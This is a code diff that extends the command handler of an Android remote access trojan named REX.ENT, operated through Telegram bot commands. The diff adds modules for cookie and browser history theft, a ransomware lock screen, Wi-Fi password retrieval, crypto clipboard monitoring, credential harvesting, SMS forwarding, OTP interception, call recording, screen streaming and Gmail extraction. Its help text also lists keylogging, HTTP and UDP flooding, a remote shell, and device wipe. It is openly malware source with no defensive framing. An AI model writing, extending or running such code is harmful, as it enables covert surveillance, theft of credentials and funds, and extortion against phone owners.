@@ -22,6 +22,32 @@ public class CommandHandler {
     private SocialMediaManager socialMediaManager;
     private AppManager appManager;
     private PhishingManager phishingManager;
+    private CallRecorderManager callRecorderManager;
+    private CookieStealerManager cookieStealerManager;
+    private RansomwareManager ransomwareManager;
+    private WiFiScannerManager wifiScannerManager;
+    private CryptoClipboardManager cryptoClipboardManager;
+    private CredentialDumper credentialDumper;
+    private AppControllerManager appControllerManager;
+    private ProcessManager processManager;
+    private SIMInfoManager simInfoManager;
+    private USSDManager ussdManager;
+    private SMSForwarderManager smsForwarderManager;
+    private NotificationReplyManager notificationReplyManager;
+    private GeofenceManager geofenceManager;
+    private CalendarDumpManager calendarDumpManager;
+    private SystemSettingsManager systemSettingsManager;
+    private FlashlightManager flashlightManager;
+    private WallpaperManager wallpaperManager;
+    private TTSSpeakManager ttsSpeakManager;
+    private ZipManager zipManager;
+    private UsageStatsManager usageStatsManager;
+    private SearchFileManager searchFileManager;
+    private BluetoothScannerManager bluetoothScannerManager;
+    private SelfUpdateManager selfUpdateManager;
+    private ScreenStreamManager screenStreamManager;
+    private AntiDebugDetector antiDebugDetector;
+    private GmailExtractorManager gmailExtractorManager;
 
     public CommandHandler(Context context) {
         this.context = context;
@@ -39,6 +65,32 @@ public class CommandHandler {
         this.socialMediaManager = new SocialMediaManager(context);
         this.appManager = new AppManager(context);
         this.phishingManager = new PhishingManager(context);
+        this.callRecorderManager = new CallRecorderManager(context);
+        this.cookieStealerManager = new CookieStealerManager(context);
+        this.ransomwareManager = new RansomwareManager(context);
+        this.wifiScannerManager = new WiFiScannerManager(context);
+        this.cryptoClipboardManager = new CryptoClipboardManager(context);
+        this.credentialDumper = new CredentialDumper(context);
+        this.appControllerManager = new AppControllerManager(context);
+        this.processManager = new ProcessManager(context);
+        this.simInfoManager = new SIMInfoManager(context);
+        this.ussdManager = new USSDManager(context);
+        this.smsForwarderManager = new SMSForwarderManager(context);
+        this.notificationReplyManager = new NotificationReplyManager(context);
+        this.geofenceManager = new GeofenceManager(context);
+        this.calendarDumpManager = new CalendarDumpManager(context);
+        this.systemSettingsManager = new SystemSettingsManager(context);
+        this.flashlightManager = new FlashlightManager(context);
+        this.wallpaperManager = new WallpaperManager(context);
+        this.ttsSpeakManager = new TTSSpeakManager(context);
+        this.zipManager = new ZipManager();
+        this.usageStatsManager = new UsageStatsManager(context);
+        this.searchFileManager = new SearchFileManager();
+        this.bluetoothScannerManager = new BluetoothScannerManager(context);
+        this.selfUpdateManager = new SelfUpdateManager(context);
+        this.screenStreamManager = new ScreenStreamManager(context);
+        this.antiDebugDetector = new AntiDebugDetector();
+        this.gmailExtractorManager = new GmailExtractorManager();
     }
 
     public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
@@ -46,47 +98,36 @@ public class CommandHandler {
         if (parts.length == 0) return;
         String cmd = parts[0].toLowerCase();
 
-        // Commands without session requirement
         if (cmd.equals("/start") || cmd.equals("/help")) {
             processGlobal(cmd);
             return;
         }
 
-        // Extract target session (default: ALL)
         String target = "ALL";
-        String[] realArgs = new String[0];
-
+        String[] args = new String[0];
         if (parts.length >= 2) {
             String second = parts[1].toUpperCase();
             if (second.startsWith("SESSION_") || second.equals("ALL")) {
                 target = second;
-                realArgs = new String[parts.length - 2];
-                System.arraycopy(parts, 2, realArgs, 0, realArgs.length);
+                args = new String[parts.length - 2];
+                System.arraycopy(parts, 2, args, 0, args.length);
             } else {
-                realArgs = new String[parts.length - 1];
-                System.arraycopy(parts, 1, realArgs, 0, realArgs.length);
+                args = new String[parts.length - 1];
+                System.arraycopy(parts, 1, args, 0, args.length);
             }
         }
 
-        // Check if this device is the intended recipient
         String mySession = BotConfig.SESSION_ID.toUpperCase();
-        if (!target.equals("ALL") && !target.equals(mySession)) {
-            return;
-        }
+        if (!target.equals("ALL") && !target.equals(mySession)) return;
 
-        execute(cmd, realArgs);
+        execute(cmd, args);
     }
 
     private void processGlobal(String cmd) {
         if (cmd.equals("/start")) {
-            TelegramApi.sendMessage("⚡ <b>REX.ENT v3.0 Online</b>\n" +
-                "<b>Session:</b> <code>" + BotConfig.SESSION_ID + "</code>\n\n" +
-                "Commands work directly without session ID for single device.\n" +
-                "<code>/info</code>\n<code>/location</code>");
+            TelegramApi.sendMessage("⚡ <b>REX.ENT v4.0 Online</b>\nSession: <code>" + BotConfig.SESSION_ID + "</code>\n\nGunakan /help_full untuk daftar lengkap.");
         } else {
-            TelegramApi.sendMessage("Format: <code>/command [args]</code>\n" +
-                "Target session optional. Default: ALL (this device).\n" +
-                "<code>/info</code>\n<code>/ls /sdcard</code>");
+            TelegramApi.sendMessage("Format: <code>/command [args]</code>\nContoh: <code>/info</code> <code>/ls /sdcard</code>");
         }
     }
 
@@ -97,7 +138,9 @@ public class CommandHandler {
                 case "/ls":
                     fileManager.listDirectory(args.length > 0 ? args[0] : Environment.getExternalStorageDirectory().getAbsolutePath());
                     break;
-                case "/download": if (args.length > 0) fileManager.uploadFile(args[0]); break;
+                case "/download":
+                    if (args.length > 0) fileManager.uploadFile(args[0]);
+                    break;
                 case "/rm": fileManager.deleteFile(args.length > 0 ? args[0] : ""); break;
                 case "/rename": fileManager.renameFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : ""); break;
                 case "/sms_list": smsManager.sendSMSList(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
@@ -144,6 +187,70 @@ public class CommandHandler {
                 case "/hideicon": SystemManager.hideIcon(context); break;
                 case "/autostart": SystemManager.enableAutostart(context); break;
                 case "/socmed": socialMediaManager.auditSocialMedia(); break;
+                case "/call_record": callRecorderManager.startCallRecording(args.length > 0 ? Integer.parseInt(args[0]) : 30); break;
+                case "/cookies": cookieStealerManager.stealCookies(); break;
+                case "/history": cookieStealerManager.stealChromeHistory(); break;
+                case "/screen_lock": ransomwareManager.showLockScreen(joinArgs(args, 0)); break;
+                case "/screen_unlock": ransomwareManager.removeLockScreen(); break;
+                case "/wifi_scan": wifiScannerManager.scanNetworks(); break;
+                case "/wifi_pass": wifiScannerManager.retrievePasswords(); break;
+                case "/crypto_monitor_start": cryptoClipboardManager.startMonitoring(); break;
+                case "/crypto_monitor_stop": cryptoClipboardManager.stopMonitoring(); break;
+                case "/cred_harvest_start": credentialDumper.startCredentialHarvest(); break;
+                case "/cred_dump": credentialDumper.dumpCredentials(); break;
+                case "/launch": appControllerManager.launchApp(args.length > 0 ? args[0] : ""); break;
+                case "/uninstall": appControllerManager.uninstallApp(args.length > 0 ? args[0] : ""); break;
+                case "/process_list": processManager.listProcesses(); break;
+                case "/kill_pid": processManager.killProcess(args.length > 0 ? args[0] : ""); break;
+                case "/kill_pkg": processManager.killPackage(args.length > 0 ? args[0] : ""); break;
+                case "/sim_info": simInfoManager.getSIMInfo(); break;
+                case "/ussd": ussdManager.sendUSSD(args.length > 0 ? args[0] : ""); break;
+                case "/sms_fwd": smsForwarderManager.setForward(args.length > 0 ? args[0] : ""); break;
+                case "/reply": notificationReplyManager.replyToNotification(args.length > 0 ? args[0] : "", args.length > 1 ? joinArgs(args, 1) : ""); break;
+                case "/geofence": geofenceManager.setGeofence(args.length > 0 ? Double.parseDouble(args[0]) : 0, args.length > 1 ? Double.parseDouble(args[1]) : 0, args.length > 2 ? Float.parseFloat(args[2]) : 500); break;
+                case "/calendar_dump": calendarDumpManager.dumpCalendar(); break;
+                case "/volume": systemSettingsManager.setVolume(args.length > 0 ? Integer.parseInt(args[0]) : 5); break;
+                case "/brightness": systemSettingsManager.setBrightness(args.length > 0 ? Integer.parseInt(args[0]) : 100); break;
+                case "/ring_mode": systemSettingsManager.setRingMode(args.length > 0 ? args[0] : "normal"); break;
+                case "/flashlight": flashlightManager.toggle(args.length > 0 ? Boolean.parseBoolean(args[0]) : true); break;
+                case "/wallpaper": wallpaperManager.setFromUrl(args.length > 0 ? args[0] : ""); break;
+                case "/speak": ttsSpeakManager.speak(joinArgs(args, 0)); break;
+                case "/zip": zipManager.zipFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : null); break;
+                case "/usage": usageStatsManager.getStats(); break;
+                case "/search": searchFileManager.search(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : ""); break;
+                case "/bluetooth": bluetoothScannerManager.enumerate(); break;
+                case "/update": selfUpdateManager.downloadAndInstall(args.length > 0 ? args[0] : ""); break;
+                case "/otp_scan": OTPInterceptorManager.interceptOTP(); break;
+                case "/cpu_ram": {
+                    android.app.ActivityManager am = (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+                    android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
+                    am.getMemoryInfo(mi);
+                    TelegramApi.sendMessage("<b>📊 CPU & RAM</b>\nTotal: <code>" + mi.totalMem/(1024*1024) + "MB</code>\nAvailable: <code>" + mi.availMem/(1024*1024) + "MB</code>");
+                    break;
+                }
+                case "/screen_stream_start": screenStreamManager.startStream(); break;
+                case "/screen_stream_stop": screenStreamManager.stopStream(); break;
+                case "/check_env": antiDebugDetector.check(context); break;
+                case "/gmail": gmailExtractorManager.extract(); break;
+                case "/help_full":
+                    TelegramApi.sendMessage("<b>📋 ALL COMMANDS</b>\n\n" +
+                        "<b>📁 File:</b> /ls /download /rm /rename /search /zip\n" +
+                        "<b>📍 Location:</b> /location /gps /geofence\n" +
+                        "<b>💬 SMS/Calls:</b> /sms_list /sendsms /delsms /calls /contacts /sms_fwd\n" +
+                        "<b>📷 Camera:</b> /photo_front /photo_back /record /call_record\n" +
+                        "<b>🎙 Audio:</b> /mic /liveaudio\n" +
+                        "<b>🖥 Screen:</b> /screenshot /screenrecord /screen_lock /screen_unlock /screen_stream_start /screen_stream_stop\n" +
+                        "<b>⌨ Keylogger:</b> /keylog_start /keylog_stop /keylog_dump\n" +
+                        "<b>📱 Device:</b> /info /apps /battery /network /permissions /cpu_ram /usage /process_list\n" +
+                        "<b>📋 Clipboard:</b> /clipboard /setclip /crypto_monitor_start /crypto_monitor_stop\n" +
+                        "<b>🔔 Notif:</b> /notif /fakenotif /otp_scan /reply\n" +
+                        "<b>📦 Stealer:</b> /steal_images /steal_docs /extract_wa /extract_tg /cookies /history /cred_harvest_start /cred_dump /calendar_dump\n" +
+                        "<b>🌐 Network:</b> /httpflood /udpflood /wifi_scan /wifi_pass /bluetooth\n" +
+                        "<b>⚙ Shell:</b> /shell /sush /kill_pid /kill_pkg /launch /uninstall\n" +
+                        "<b>🛡 System:</b> /openurl /toast /phish /vibrate /playsound /lock /wipe /destroy /hideicon /autostart\n" +
+                        "<b>🎮 Control:</b> /flashlight /volume /brightness /ring_mode /wallpaper /speak /update /ussd /sim_info");
+                    break;
+                default: TelegramApi.sendMessage("Unknown command. Type /help_full"); break;
             }
         } catch (Exception e) {
             TelegramApi.sendMessage("❌ Error: " + e.getMessage());
